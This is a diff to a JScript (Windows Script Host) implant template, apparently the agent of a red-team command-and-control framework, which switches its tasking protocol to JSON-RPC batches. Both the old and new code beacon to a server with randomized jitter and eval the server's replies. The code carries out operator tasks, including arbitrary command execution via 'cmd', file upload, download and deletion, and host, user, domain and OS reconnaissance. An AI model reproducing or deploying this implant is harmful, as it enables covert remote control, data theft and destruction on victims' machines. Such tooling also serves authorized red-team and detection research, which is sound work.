@@ -1,6 +1,6 @@
 var errors = 0;
 var wscriptshell = new ActiveXObject("WScript.Shell");
-var job_req = '[["{{ key }}"]]';
+var batch_response = '{{key}}';
 var check_in_job_id = '';
 var sleep = {{ sleep }};
 var jitter = {{ jitter }};
@@ -35,19 +35,18 @@ function post(data){
 
 while (true) {
   try {
-      eval("json_object=" + post(job_req).responseText + ";");
+      eval("batch_request=" + post(batch_response).responseText + ";");
   } catch (e) {
-      job_req = '[["' + check_in_job_id + '"]]';;
-      WScript.Sleep(((sleep - (sleep * jitter)) + Math.random() * ((sleep * jitter) * 2)) * 1000);
+      batch_response = '[{"jsonrpc": "2.0", "error": {"code":-32700, "message":"Parse error"}, "id": "' + check_in_job_id + '"}]';
+      WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
       continue;
   }
   try {
-      job_req = '[';
-      jobs = json_object.job_rep
-      for (var job in jobs) {
-          var id = jobs[job].id
-          var name = jobs[job].name
-          var args = jobs[job].arguments.toString().split(',');
+      batch_response = '[';
+      for (var job in batch_request) {
+          var id = batch_request[job].id
+          var name = batch_request[job].method
+          var args = batch_request[job].params.toString().split(',');
           try {
               var results = '';
               if ('check_in' == name){
@@ -55,54 +54,57 @@ while (true) {
                   break;
               }
               if ('upload' === name) {
-                  results = upload(b64d(args[0], "bin"), b64d(args[1]));
+                  result = '"' + upload(b64d(args[0], "bin"), b64d(args[1])) + '"';
               }
               if ('download' === name) {
-                  results = download(b64d(args[0]));
+                  result = '"' + download(b64d(args[0])) + '"';
               }
               if ('dir' === name) {
-                  results = dir(b64d(args[0]));
+                  result = '"' + dir(b64d(args[0])) + '"';
               }
               if ('whoami' === name) {
-                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
+                  username = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%")) + '"';
+                  result = '["' + username + '","' + username + '"]';
               }
               if ('tmp' === name) {
-                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%"));
+                  result = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%")) + '"';
               }
               if ('hostname' === name) {
-                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
+                  hostname = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
+                  result = '["' + hostname + '","' + hostname + '"]';
               }
               if ('domain' === name) {
-                  results = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%"));
+                  result = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%")) + '"';
               }
               if ('os' === name) {
-                  results = b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber"));
+                  result = '"' + b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber")) + '"';
               }
               if ('cmd' === name) {
-                  results = cmd(b64d(args[0]));
+                  result = '"' + cmd(b64d(args[0])) + '"';
               }
               if ('delfile' === name) {
-                  results = delfile(b64d(args[0]));
+                  result = '"' + delfile(b64d(args[0])) + '"';
               }
               if ('delay' === name) {
-                  results = b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + '%');
+                  result = '"' + b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + '%') + '"';
               }
               if('set jitter' === name){
                   jitter = b64d(args[0]);
-                  results = b64e('Changed jitter to ' + jitter + ' %');
+                  result = '["' + b64e('Changed jitter to ' + jitter + ' %') + '","' + b64e(jitter) + '"]';
               }
               if('set sleep' === name){
                   sleep = b64d(args[0]);
-                  results = b64e('Changed sleep to ' + sleep + ' second(s)');
+                  result = '["' + b64e('Changed sleep to ' + sleep + ' second(s)') + '","' + b64e(sleep) + '"]';
               }
-              job_req = job_req + '["' + id + '","' +  results + '"],';
+              batch_response = batch_response + '{"jsonrpc": "2.0", "result": ' + result  + ',"id":"' + id + '"},';
           } catch (e) {
-             job_req = job_req + '["' + id + '","' + b64e("Job Failed: " + e.message) + '"],';
+             batch_response = batch_response + '{"jsonrpc": "2.0", "error": {"code":-32602,"message":"' + b64e(e.message) + '"}","id":"' + id + '"},';
+
           }
       }
   } catch (e) {
       // caught for reliability
   }
-  job_req = job_req + '["' + check_in_job_id + '"]]';
+  batch_response = batch_response + '{"jsonrpc": "2.0", "result": "", "id": "' + check_in_job_id + '"}]';
   WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
 }
